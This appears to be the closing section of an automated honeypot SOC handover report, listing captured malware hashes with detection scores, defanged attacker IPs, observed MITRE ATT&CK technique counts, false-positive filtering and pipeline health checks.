| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `143.110.178[.]27` | IN | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `220.124.230[.]188` | KR | Korea Telecom | **100** ⚠️ | 31 |
| `185.180.141[.]47` | US | ICG-1-ZEN-DFW | **100** ⚠️ | 50 |
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `185.180.141[.]48` | US | ICG-1-ZEN-DFW | **100** ⚠️ | 50 |
| `144.79.133[.]50` | BD | Hoststall.com | **100** ⚠️ | 5 |
| `107.172.250[.]235` | US | HostPapa | **100** ⚠️ | 26 |
| `160.30.137[.]84` | VN | DATAZ TECHNOLOGY COMPANY LIMITED | **100** ⚠️ | 1 |
| `120.28.198[.]192` | PH | GBB VISAYAS | **100** ⚠️ | 0 |
| `185.180.141[.]50` | US | ICG-1-ZEN-DFW | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 128 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 79 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 47 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 22 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 21 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 471 cases |
| Tool 34  | Credential Extractor        | ✅ 128 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (6.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 47 priority case(s) shown individually · 18 recon entry/entries in table (13 group(s) consolidating 390 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-09T23:19:57Z_
